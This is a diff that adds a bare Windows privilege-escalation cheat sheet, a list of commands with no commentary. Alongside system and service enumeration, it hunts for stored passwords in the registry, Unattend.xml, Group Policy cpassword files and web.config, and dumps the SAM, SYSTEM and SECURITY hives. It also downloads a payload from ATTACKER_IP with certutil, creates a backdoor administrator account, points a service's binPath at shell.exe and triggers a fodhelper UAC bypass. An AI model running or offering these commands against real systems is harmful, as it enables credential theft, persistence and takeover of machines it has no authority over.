@@ -1,0 +1,186 @@
+```
+whoami
+whoami /priv
+whoami /groups
+hostname
+systeminfo
+ipconfig /all
+route print
+arp -a
+netstat -ano
+
+net user
+net user USERNAME
+net localgroup
+net localgroup administrators
+net localgroup "Remote Desktop Users"
+net localgroup "Remote Management Users"
+net accounts
+net share
+net use
+net session
+
+query user
+quser
+qwinsta
+klist
+cmdkey /list
+
+set
+echo %USERNAME%
+echo %USERDOMAIN%
+echo %COMPUTERNAME%
+echo %PATH%
+
+sc query
+sc query state= all
+sc qc SERVICE_NAME
+sc sdshow SERVICE_NAME
+
+wmic service get name,displayname,pathname,startmode
+wmic service get name,pathname | findstr /i "auto"
+wmic service get name,pathname | findstr /i /v "C:\Windows\\"
+wmic service get name,pathname | findstr /i /v "\""
+
+sc stop SERVICE_NAME
+sc start SERVICE_NAME
+net stop SERVICE_NAME
+net start SERVICE_NAME
+
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME /v ImagePath
+
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f pass /t REG_SZ /s
+reg query HKCU /f pass /t REG_SZ /s
+
+dir /s /b *password*
+dir /s /b *pass*
+dir /s /b *cred*
+dir /s /b *.config
+dir /s /b *.ini
+dir /s /b *.xml
+dir /s /b *.txt
+
+findstr /si password *.txt *.ini *.xml *.config
+findstr /si pass *.txt *.ini *.xml *.config
+findstr /si pwd *.txt *.ini *.xml *.config
+findstr /si username *.txt *.ini *.xml *.config
+
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+dir /a C:\
+dir /a C:\Users
+dir /a C:\Users\%USERNAME%
+dir /a C:\Users\%USERNAME%\Desktop
+dir /a C:\Users\%USERNAME%\Documents
+
+schtasks /query /fo LIST /v
+schtasks /query /fo CSV /v
+
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+wmic startup get caption,command
+
+driverquery
+driverquery /v
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+wmic product get name,version,vendor
+
+netsh advfirewall show allprofiles
+netsh advfirewall firewall show rule name=all
+
+tasklist
+tasklist /svc
+wmic process get caption,commandline,processid
+
+wmic logicaldisk get caption,description,filesystem
+fsutil fsinfo drives
+
+icacls "C:\Program Files"
+icacls "C:\Program Files (x86)"
+icacls C:\ProgramData
+icacls C:\Users
+icacls "C:\Path\To\Service.exe"
+
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Users" *
+accesschk.exe -uws "Everyone" "C:\Program Files"
+accesschk.exe -uws "Users" "C:\Program Files"
+
+where /R C:\ *.exe
+where /R C:\ *.bat
+where /R C:\ *.ps1
+
+dir /s /b unattend.xml
+dir /s /b sysprep.inf
+dir /s /b sysprep.xml
+type C:\Windows\Panther\Unattend.xml
+type C:\Windows\System32\Sysprep\sysprep.inf
+
+dir /s /b Groups.xml
+dir /s /b Services.xml
+dir /s /b Scheduledtasks.xml
+findstr /S /I cpassword \\DOMAIN\SYSVOL\*.xml
+
+dir /s /b web.config
+type C:\inetpub\wwwroot\web.config
+
+iisreset /status
+sc query W3SVC
+
+sc query WinDefend
+
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+
+whoami /priv | findstr /i "SeImpersonatePrivilege"
+whoami /priv | findstr /i "SeAssignPrimaryTokenPrivilege"
+whoami /priv | findstr /i "SeBackupPrivilege"
+whoami /priv | findstr /i "SeRestorePrivilege"
+whoami /priv | findstr /i "SeDebugPrivilege"
+
+reg save hklm\sam sam.save
+reg save hklm\system system.save
+reg save hklm\security security.save
+
+vssadmin list shadows
+wmic shadowcopy list
+
+copy C:\Windows\System32\config\SAM .
+copy C:\Windows\System32\config\SYSTEM .
+copy C:\Windows\System32\config\SECURITY .
+
+dir \\127.0.0.1\C$
+dir \\localhost\C$
+net use \\127.0.0.1\C$
+
+certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe
+
+net user hacker Password123! /add
+net localgroup administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /add
+net localgroup "Remote Management Users" hacker /add
+
+runas /user:administrator cmd.exe
+runas /netonly /user:DOMAIN\user cmd.exe
+
+sc config SERVICE_NAME binPath= "C:\Path\shell.exe"
+sc config SERVICE_NAME obj= LocalSystem
+
+fodhelper.exe
+```
